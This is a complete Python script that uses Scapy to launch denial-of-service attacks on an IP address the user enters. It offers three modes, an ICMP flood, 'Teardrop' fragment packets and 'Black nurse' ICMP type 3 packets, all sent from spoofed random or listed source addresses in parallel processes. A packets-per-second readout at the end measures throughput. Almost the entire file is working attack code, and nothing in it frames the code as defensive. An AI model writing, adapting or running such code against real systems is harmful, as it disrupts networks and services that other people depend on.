import sys, random
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import scapy
from scapy.all import *
import config
import multiprocessing, time


dst_ip = raw_input("IP to attack: ") if config.dst_ip == "" else config.dst_ip
n_ips = raw_input("Number of IPs: ") if config.n_ips == "" else config.n_ips
n_msg = raw_input("Number of messages per IP: ") if config.n_msg == "" else config.n_msg
interface = raw_input("Inteface: ") if config.interface == "" else config.interface
type = raw_input("Select type: \n1) Flood \n2) Teardrop \n3) Black nurse\nYour choice: ") if config.type == "" else config.type
orig_type = raw_input("Select IPs origin: \n1) From ips.txt \n2) Random\nYour choice: ") if config.orig_type == "" else config.orig_type

ips = []

def get_random_ips(n):
	for i in range(0,int(n)):
		ip_gen = str(random.randint(0,255)) + "." +str(random.randint(0,255)) + "." +str(random.randint(0,255)) + "." +str(random.randint(0,255))
		ips.append(ip_gen)

def get_text_total_ips():
	f_ips = []
	for line in open("ips.txt"):
		f_ips.append(line.replace('\n',''))
	for n in range ( 0, ( int(n_ips) / len(f_ips) ) ):
		for ip in f_ips:
			ips.append(ip)
	for j in range ( 0, ( int(n_ips) % len(f_ips) ) ):
		ips.append(f_ips[j])

def sendPacketFlood(origin_ip):
	send((IP(dst=dst_ip,src=origin_ip)/ICMP())*int(n_msg), iface=interface, verbose=False)

def sendPacketMF(origin_ip):
	send((IP(dst=dst_ip, src=origin_ip, flags="MF", proto = 17, frag = 0)/ICMP()/("load"*int(1)))*int(n_msg), iface=interface, verbose=False)

def sendPacketT3(origin_ip):
	send((IP(dst=dst_ip,src=origin_ip)/ICMP(type=3, code=3))*int(n_msg), iface=interface, verbose=False)


if orig_type == "2":
	get_random_ips(n_ips)
else:
	get_text_total_ips()


# With threading
t0 = time.time()

p = multiprocessing.Pool(int(config.threads))
if type == "1":
	p.map(func=sendPacketFlood,iterable=ips) 
elif type == "2":
	p.map(func=sendPacketMF,iterable=ips) 
elif type == "3":
	p.map(func=sendPacketT3,iterable=ips) 
else:
	print "Type unknown"
p.close()

'''
# Without threading
count = 0
while(count < int(n_ips)):
	count += 1
	if type == "1":
		send((IP(dst=dst_ip,src=ips[count%len(ips)])/ICMP()), iface=interface)
	elif type == "2":
		send((IP(dst=dst_ip, src=ips[count%len(ips)], flags="MF", proto = 17, frag = 0)/ICMP()/("load"*int(1))), iface=interface)
	elif type == "3":
		send((IP(dst=dst_ip,src=ips[count%len(ips)])/ICMP(type=3, code=3)), iface=interface)
	else:
		print "Type unknown"
'''
total_s = float(time.time() - t0)
total_p = int(n_ips) * int(n_msg)
ratio = float(total_p)/float(total_s)
print "Total: \n%d seconds" % (total_s)
print "%d packets\n%d p/s" % (total_p, ratio)

